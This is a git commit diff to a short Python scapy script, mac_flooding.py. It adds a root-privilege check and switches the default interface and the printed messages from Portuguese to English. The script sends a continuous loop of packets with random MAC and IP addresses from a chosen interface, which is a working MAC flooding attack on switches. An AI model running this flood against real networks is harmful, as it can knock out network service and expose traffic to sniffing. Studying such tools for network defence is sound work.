8e55f8652a89fb52272689d55480eca82bb7dea4
Daniel Magevski <daniel_magevski@hotmail.com>
2018-08-07 20:57:53 -0300

    update

--- mac_flooding.py
+++ mac_flooding.py
@@ -1,15 +1,22 @@
 #!/usr/bin/python
 
 import sys
+import os
 from scapy.all import *
+
+if os.geteuid() != 0:
+        exit("You need to root privileges")
+
 packet = Ether(src=RandMAC("*:*:*:*:*:*"),
         dst=RandMAC("*:*:*:*:*:*")) / \
         IP(src=RandIP("*.*.*.*"),
         dst=RandIP("*.*.*.*")) / \
             ICMP()
+
 if len(sys.argv) < 2:
-    dev = "eth0" #Seleciona a interface
+    dev = "wlp2s0" # Set networking interface
 else:
     dev = sys.argv[1]
-print "Floodando com pacotes randomicos " + dev
+print "\n Press Crtl+C to stop\n"
+print "Flooding MAC at " + dev
 sendp(packet, iface=dev, loop=1)
